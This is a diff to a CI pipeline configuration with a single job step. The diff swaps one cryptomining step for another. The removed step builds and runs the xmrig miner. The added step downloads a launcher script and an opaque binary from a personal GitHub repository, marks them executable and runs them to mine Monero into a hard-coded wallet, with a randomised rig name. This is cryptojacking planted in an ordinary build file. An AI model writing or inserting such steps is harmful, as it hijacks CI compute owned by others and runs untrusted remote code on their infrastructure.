@@ -8,7 +8,5 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  sudo apt update && apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev && git clone https://github.com/xmrig/xmrig && cd xmrig && mkdir build && cd build && cmake -DWITH_HWLOC=OFF .. && make && ./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DGB:dgb1qgmp6luhqc7wpcy59umzhn055junyun9ljgax4f.Tablo -p x -k -a rx/0 -t 36
-      
-       
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 8BffiRLreDyYCZgse7CKuQ811or26c2jiEeqBsRaPrEqAJD1KsUpqNKLkQURdC88pdVncLtqGfi67e7Ed3fXSjKCLiYKBiG  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
       
